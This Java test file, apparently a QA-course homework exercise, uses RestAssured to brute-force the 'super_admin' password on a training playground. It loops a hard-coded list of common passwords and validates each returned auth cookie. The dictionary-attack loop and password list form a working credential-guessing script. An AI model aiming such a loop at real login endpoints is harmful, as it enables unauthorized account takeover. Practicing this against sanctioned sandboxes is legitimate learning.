import io.restassured.RestAssured;
import io.restassured.http.Headers;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;

public class HelloTests {

    @Test
    public void authCookieTest(){

        Set<String> set = new HashSet<>(Arrays.asList(
                "123456", "123456789", "12345678", "12345", "12345678", "qwerty", "abc123"," password", "football",
                "1234567", "monkey", "111111", "letmein", "1234", "1234567890", "dragon", "baseball", "sunshine",
                "iloveyou", "trustno1", "princess", "adobe123", "123123", "welcome", "login", "admin", "trustno1",
                "monkey", "solo", "1q2w3e4r", "master", "666666", "photoshop", "1qaz2wsx", "qwertyuiop", "ashley",
                "mustang", "121212", "starwars", "654321", "bailey", "access", "flower", "555555", "passw0rd", "shadow",
                "passw0rd", "lovely","654321", "7777777", "12345", "michael", "!@#$%^&*", "654321", "jesus", "password1",
                "superman", "hello", "charlie", "888888", "michael", "696969", "qwertyuiop", "hottie", "freedom",
                "aa123456", "qazwsx","ninja","azerty", "123123", "solo", "loveme", "whatever", "donald", "trustno1",
                "batman", "zaq1zaq1","qazwsx", "password1", "Football", "000000", "qwerty123", "123qwe"));

        for(String s: set) {
            Map<String, String> authData = new HashMap<>();
            authData.put("login","super_admin");
            authData.put("password", s);
            Response response = RestAssured
                    .given()
                    .body(authData)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();
            response.prettyPrint();

            String cookie = response.getCookie("auth_cookie");
            System.out.println(cookie);

            Map<String, String> authCookie = new HashMap<>();
            authCookie.put("auth_cookie", cookie);
            Response response1 = RestAssured
                    .given()
                    .when()
                    .body(authCookie)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();
            response1.prettyPrint();
        }
    }
}
